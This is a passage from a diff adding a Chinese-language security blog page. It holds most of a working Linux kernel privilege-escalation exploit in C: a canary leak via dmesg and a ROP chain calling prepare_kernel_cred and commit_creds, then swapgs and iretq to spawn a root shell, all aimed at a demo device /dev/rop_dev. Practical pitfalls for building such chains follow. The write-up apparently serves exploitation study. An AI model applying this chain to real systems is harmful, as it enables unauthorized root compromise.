+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">19</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(name, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;open %s error!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">18</span>, fp);
+</span></span><span style="display:flex;"><span>    addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;the addr(0x) is: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)addr);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (addr <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;string conversion integer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> addr;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> <span style="color:#a6e22e">get_canary</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;dmesg | grep canary &gt; canary&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;the cmd is: dmesg | grep canary &gt; canary&#34;</span>);
+</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;canary&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;open canary error&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">100</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> canary <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(buf, <span style="color:#ae81ff">100</span>, fp);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str_canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34;0x&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(str_canary);
+</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(str_canary, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(fp);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;the canary is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, canary);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> canary;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rop</span>(<span style="color:#66d9ef">size_t</span> offset, <span style="color:#66d9ef">size_t</span> <span style="color:#f92672">*</span>ROP, <span style="color:#66d9ef">size_t</span> commit_creds, <span style="color:#66d9ef">size_t</span> prepare_kernel_cred)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8106b910</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// pop rdi, ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> prepare_kernel_cred;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8105bd21</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// test rcx,rcx ; jne 0xffffffff8105bcc6 ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8110c68a</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// mov rdi, rax ; jne 0xffffffff8110c672 ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> commit_creds;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81a00d5e</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// swapgs ; popfq ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81024b3b</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// iretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">size_t</span>)get_shell;          <span style="color:#75715e">// rip
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> base, commit_creds, prepare_kernel_cred;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    base <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_addr</span>(<span style="color:#e6db74">&#34;startup_64&#34;</span>);
+</span></span><span style="display:flex;"><span>    commit_creds <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_addr</span>(<span style="color:#e6db74">&#34;commit_creds&#34;</span>);
+</span></span><span style="display:flex;"><span>    prepare_kernel_cred <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_addr</span>(<span style="color:#e6db74">&#34;prepare_kernel_cred&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> offset <span style="color:#f92672">=</span> base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xffffffff81000000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;offset 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, offset);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/rop_dev&#34;</span>, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">==</span> fd)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;open /dev/rop_dev error&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> payload1[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, payload1, <span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, payload1, <span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_canary</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> payload2[<span style="color:#ae81ff">17</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    payload2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6161616161616161</span>;
+</span></span><span style="display:flex;"><span>    payload2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6262626262626262</span>;
+</span></span><span style="display:flex;"><span>    payload2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> canary;
+</span></span><span style="display:flex;"><span>    payload2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6363636363636363</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_status</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">rop</span>(offset, <span style="color:#f92672">&amp;</span>payload2[<span style="color:#ae81ff">4</span>], commit_creds, prepare_kernel_cred);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, payload2, <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">21</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;success&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="五-踩坑记录">五. 踩坑记录</h3>
+<ol>
+<li>高版本linux canary存在\x00截断(低版本没有)</li>
+<li>使用ROPgadget获得的gadget片段有可能存在于vmlinux的数据区 (不管是代码还是数据在内存中都只是一堆二进制数字), 所以如果内核开启NX保护, 那么内核数据区的gadget就不能用于ROP链构造</li>
+<li>使用iretq从内核态切换至用户态时，出现段错误(用户态数据被正常还原)
+<ul>
+<li>解决方案: 将qemu的cpu启动参数由kvm64切换为qemu64</li>
+</ul>
+</li>
+<li>ROPgadget 获得的代码片段中没有iretq和sysretq
+<ul>
+<li>原因：ROPgadget工具获得的代码片段作用于程序流程控制，即ret, call 等元素必须存在，但是内核态返回用户态只需执行 iretq指令，与其后接的汇编无关，由此看来，使用ROPgadget工具获得的内容是少于需求的，所以有可能iretq,sysretq, 不存在于获得的代码片段中</li>
+<li>解决方案：</li>
+</ul>
+<ol>
+<li>python 进行iretq编码匹配</li>
+<li>ida 解析vmlinux 查找iretq指令</li>
+</ol>
+</li>
+</ol>
+</section>
+
+  
+  
+
+  
+  
+  
+  
+  <nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]">
+    
+    <a
+      class="flex w-1/2 items-center rounded-l-md p-6 pr-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/kernel_rop2/"
+      ><span class="mr-1.5">←</span><span>linux 内核提权总结(demo&#43;exp分析) -- ROP(二)</span></a
+    >
+    
+    
+    <a
+      class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]"
+      href="https://povcfe.github.io/post/ptmalloc/"
+      ><span>glibc2.23 ptmalloc 原理概述</span><span class="ml-1.5">→</span></a
+    >
+    
+  </nav>
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2024
+    <a class="link" href="https://povcfe.github.io/">povcfe&#39;s site</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
